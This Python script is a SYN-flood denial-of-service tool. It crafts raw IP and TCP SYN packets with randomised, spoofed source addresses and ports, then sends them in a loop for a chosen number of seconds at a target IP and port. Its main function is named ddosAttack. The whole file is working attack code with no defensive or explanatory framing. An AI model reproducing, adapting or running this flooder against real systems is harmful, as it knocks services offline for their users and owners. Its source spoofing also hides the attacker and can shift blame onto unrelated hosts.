import socket, sys, time
from struct import *
from random import randint
import random
import sys
import getopt


class TCP_packet:
    #def __init__(self, source_ip = '127.0.0.1', dest_ip = '192.168.43.96', source_port = 80, dest_port = 3000):
    def __init__(self, dest_ip, dest_port, source_ip = '127.0.0.1',source_port = 80):
        self.source_ip = source_ip
        self.dest_ip = dest_ip
        self.source_port = source_port
        self.dest_port = dest_port
        self.packet = ''

        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            '''
            AF_INET : IPv4 address Family
            SOCK_RAW : use raw socket to control headers of packet
            IPPROTO_RAW : use raw ip protocol
            '''

        except:
            print('error occured')
            sys.exit()



    '''
    get checksum from msg string
    by adding each string char bit
    '''
    def checksum(self, msg):
        s = 0

        for i in range(0, len(msg), 2):
            if (i+1) < len(msg):
                a = msg[i] #for each char of string
                b = msg[i+1]
                s = s + (a+(b << 8)) # shift 1 bytes and add char value (8bit shift & add)
            elif (i+1) == len(msg[i]):
                s += msg[i]

        s = (s>>16) + (s & 0xffff)
        s = s + (s >> 16)

        s = ~s & 0xffff

        return s
    '''
    making packet and adding tcp_headers
    '''
    def makePacket(self):
        # ip header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 0  # kernel will fill the correct total length
        ip_id = 54321   #Id of this packet
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP #use TCP protocol
        ip_check = 0    # kernel will fill the correct checksum
        ip_saddr = socket.inet_aton ( self.source_ip )   #Spoof the source ip address if you want to
        ip_daddr = socket.inet_aton ( self.dest_ip )

        ip_ihl_ver = (ip_ver << 4) + ip_ihl

        # the ! in the pack format string means network order
        ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)

        # tcp header fields
        tcp_seq = 454
        tcp_ack_seq = 0
        tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
        #tcp flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons (5840)    #   maximum allowed window size
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5) #1 bit shift & plus = concat

        # the ! in the pack format string means network order
        tcp_header = pack('!HHLLBBHHH' , self.source_port, self.dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)

        # pseudo header fields
        source_address = socket.inet_aton(self.source_ip)
        dest_address = socket.inet_aton(self.dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        # tcp_length = len(tcp_header) + len(user_data)
        tcp_length = len(tcp_header)

        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length)
        # psh = psh + tcp_header +bytes(user_data, 'utf-8');
        psh = psh + tcp_header

        tcp_check = self.checksum(bytearray(psh))

        # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
        tcp_header = pack('!HHLLBBH' , self.source_port, self.dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window) + pack('H' , tcp_check) + pack('!H' , tcp_urg_ptr)

        self.packet = ip_header + tcp_header
        return


    '''
    generating random ip & port# and make packet with it.
    '''
    def random_source(self, first, second, third, fourth):
        first = genRadomIp(first)
        second = genRadomIp(second)
        third = genRadomIp(third)
        fourth = genRadomIp(fourth)

        bits = random.getrandbits(32)
        self.source_ip = first + '.' + second + '.' + third + '.' + fourth #make random IPv4 address
        self.source_port = randint(0,9999) #make random port number
        self.makePacket()
        return

    def send_socket(self):
        self.socket.sendto(self.packet, (self.dest_ip, self.dest_port)) #sending packet to dest_ip & port

def genRadomIp(ip):
    if ip == -1:
        ip = str(randint(0,255))
    else:
        ip = str(ip)
    return ip

def ddosAttack(argv):
    try:
        opts, args = getopt.getopt(argv,"rs:",["random=,specific="])
    except getopt.GetoptError:
        print('tcp_linux.py -r <SourceIp> <SourcePort>')
        print('tcp_linux.py -s <Specific Ip 3byte> <SourceIp> <SourcePort>')
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-r':
            specIp = ['-1','-1','-1']
        if opt == '-s':
            specIp = str(arg).split(".")

    try :
        tcp = TCP_packet(dest_ip=args[0], dest_port= int(args[1]))
    except :
        print('tcp_linux.py -r <DestinationIp> <DestinationPort>')
        print('tcp_linux.py -s <Specific Ip 3byte> <DestinationIp> <DestinationPort>')
        sys.exit(2)

    end = input('How much seconds do you want?')
    start = time.time()
    end = start + float(end)

    count = 0 #to check how many packet was maden

    #do until time over
    while True:
        if time.time() > end:
            break
        tcp.random_source(int(specIp[0]), int(specIp[1]), int(specIp[2]), -1)
        tcp.send_socket()
        count += 1
    print(str(count) + " packets are sent")


if __name__ == "__main__":
    ddosAttack(sys.argv[1:])
